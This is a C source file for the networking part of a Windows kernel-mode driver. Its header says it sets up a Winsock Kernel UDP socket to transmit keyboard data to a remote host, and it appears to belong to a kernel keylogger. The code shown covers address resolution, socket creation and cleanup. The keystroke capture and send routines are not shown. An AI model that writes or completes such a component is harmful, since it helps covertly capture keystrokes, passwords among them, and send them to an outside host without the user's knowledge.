/*++

Module Name:
    network.c

Abstract:
    Winsock Kernel (WSK) client implementation for UDP communication.
    Provides network connectivity for transmitting keyboard data to
    a remote host.

Environment:
    Kernel mode only.

--*/

#include "network.h"

//
// Memory Pool Tag for Network Operations
//
#define NETWORK_POOL_TAG    'kteN'  // 'Netk' in little-endian

//
// Global Network State
//
SOCKET      ClientSocket = 0;
LPWSTR      g_HostName = NULL;
LPWSTR      g_PortName = NULL;
PADDRINFOEXW g_AddrInfo = NULL;

/*++

Routine: NetClient_Initialize

Description:
    Initializes a WSK UDP client socket and configures it to communicate
    with the specified remote host. This function:
    1. Allocates buffers for host and port information
    2. Resolves the remote address using WSKGetAddrInfo
    3. Creates a UDP socket
    4. Configures the socket with the remote address for sendto operations

Arguments:
    NodeName        - Remote host address (IP or hostname), e.g., L"192.168.0.2"
    ServiceName     - Remote port number as string, e.g., L"8765"
    AddressFamily   - Address family (AF_INET for IPv4, AF_INET6 for IPv6)
    SocketType      - Socket type (SOCK_DGRAM for UDP)

Return Value:
    STATUS_SUCCESS              - Socket initialized successfully
    STATUS_INSUFFICIENT_RESOURCES - Memory allocation failed
    Other NTSTATUS              - WSK operation failed

--*/
NTSTATUS 
NetClient_Initialize(
    _In_opt_ LPCWSTR        NodeName,
    _In_opt_ LPCWSTR        ServiceName,
    _In_     ADDRESS_FAMILY AddressFamily,
    _In_     USHORT         SocketType
)
{
    NTSTATUS        Status;
    ADDRINFOEXW     Hints;
    PADDRINFOEXW    CurrentAddr;
    
    Status = STATUS_SUCCESS;
    
    //
    // Allocate buffers for host and port name strings
    //
    g_HostName = (LPWSTR)ExAllocatePoolZero(
        PagedPool,
        NI_MAXHOST * sizeof(WCHAR),
        NETWORK_POOL_TAG
    );
    
    g_PortName = (LPWSTR)ExAllocatePoolZero(
        PagedPool,
        NI_MAXSERV * sizeof(WCHAR),
        NETWORK_POOL_TAG
    );
    
    if (g_HostName == NULL || g_PortName == NULL)
    {
        KBD_ERROR("NetClient_Initialize: Failed to allocate name buffers");
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Cleanup;
    }
    
    //
    // Initialize address resolution hints
    //
    RtlZeroMemory(&Hints, sizeof(ADDRINFOEXW));
    Hints.ai_family = AddressFamily;
    Hints.ai_socktype = SocketType;
    Hints.ai_protocol = (SocketType == SOCK_DGRAM) ? IPPROTO_UDP : IPPROTO_TCP;
    
    //
    // Resolve the remote address
    //
    Status = WSKGetAddrInfo(
        NodeName,
        ServiceName,
        NS_ALL,
        NULL,
        &Hints,
        &g_AddrInfo,
        WSK_INFINITE_WAIT,
        NULL,
        NULL
    );
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("WSKGetAddrInfo failed: 0x%08X", Status);
        goto Cleanup;
    }
    
    //
    // Verify we got at least one address
    //
    if (g_AddrInfo == NULL)
    {
        KBD_ERROR("Server name '%ws' could not be resolved", NodeName);
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Cleanup;
    }
    
    //
    // Iterate through resolved addresses and create socket
    //
    for (CurrentAddr = g_AddrInfo; CurrentAddr != NULL; CurrentAddr = CurrentAddr->ai_next)
    {
        //
        // Create socket
        //
        Status = WSKSocket(
            &ClientSocket,
            (ADDRESS_FAMILY)CurrentAddr->ai_family,
            (USHORT)CurrentAddr->ai_socktype,
            CurrentAddr->ai_protocol,
            NULL
        );
        
        if (!NT_SUCCESS(Status))
        {
            KBD_ERROR("WSKSocket failed: 0x%08X", Status);
            continue;
        }
        
        //
        // Get printable address and port
        //
        Status = WSKGetNameInfo(
            CurrentAddr->ai_addr,
            (ULONG)CurrentAddr->ai_addrlen,
            g_HostName,
            NI_MAXHOST,
            g_PortName,
            NI_MAXSERV,
            NI_NUMERICHOST | NI_NUMERICSERV
        );
        
        if (!NT_SUCCESS(Status))
        {
            KBD_ERROR("WSKGetNameInfo failed: 0x%08X", Status);
            WSKCloseSocket(ClientSocket);
            ClientSocket = 0;
            continue;
        }
        
        KBD_INFO("Attempting connection to %ws:%ws", g_HostName, g_PortName);
        
        //
        // For UDP sockets, configure the default remote address
        //
        if (CurrentAddr->ai_socktype == SOCK_DGRAM)
        {
            Status = WSKIoctl(
                ClientSocket,
                SIO_WSK_SET_SENDTO_ADDRESS,
                CurrentAddr->ai_addr,
                CurrentAddr->ai_addrlen,
                NULL,
                0,
                NULL,
                NULL,
                NULL
            );
            
            if (!NT_SUCCESS(Status))
            {
                KBD_ERROR("WSKIoctl SIO_WSK_SET_SENDTO_ADDRESS failed: 0x%08X", Status);
                WSKCloseSocket(ClientSocket);
                ClientSocket = 0;
                continue;
            }
        }
        
        //
        // Socket successfully configured
        //
        break;
    }
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("Unable to establish connection to %ws:%ws", NodeName, ServiceName);
        goto Cleanup;
    }
    
    KBD_INFO("Network client initialized successfully");
    
Cleanup:
    
    //
    // Clean up on failure
    //
    if (!NT_SUCCESS(Status))
    {
        if (g_HostName != NULL)
        {
            ExFreePoolWithTag(g_HostName, NETWORK_POOL_TAG);
            g_HostName = NULL;
        }
        
        if (g_PortName != NULL)
        {
            ExFreePoolWithTag(g_PortName, NETWORK_POOL_TAG);
            g_PortName = NULL;
        }
        
        if (g_AddrInfo != NULL)
        {
            WSKFreeAddrInfo(g_AddrInfo);
            g_AddrInfo = NULL;
        }
    }
    
    return Status;
}

/*++

Routine: NetClient_Cleanup

Description:
    Cleans up all network client resources. Closes the socket and
    frees all allocated memory.

Arguments:
    None.

Return Value:
    None.

--*/
VOID 
NetClient_Cleanup(
    VOID
)
{
    //
    // Free host name buffer
    //
    if (g_HostName != NULL)
    {
        ExFreePoolWithTag(g_HostName, NETWORK_POOL_TAG);
        g_HostName = NULL;
    }
    
    //
    // Free port name buffer
    //
    if (g_PortName != NULL)
    {
        ExFreePoolWithTag(g_PortName, NETWORK_POOL_TAG);
        g_PortName = NULL;
    }
    
    //
    // Free address information
    //
    if (g_AddrInfo != NULL)
    {
        WSKFreeAddrInfo(g_AddrInfo);
        g_AddrInfo = NULL;
    }
    
    //
    // Close socket
    //
    if (ClientSocket != 0)
    {
        WSKCloseSocket(ClientSocket);
        ClientSocket = 0;
    }
    
    KBD_INFO("Network client cleanup completed");
}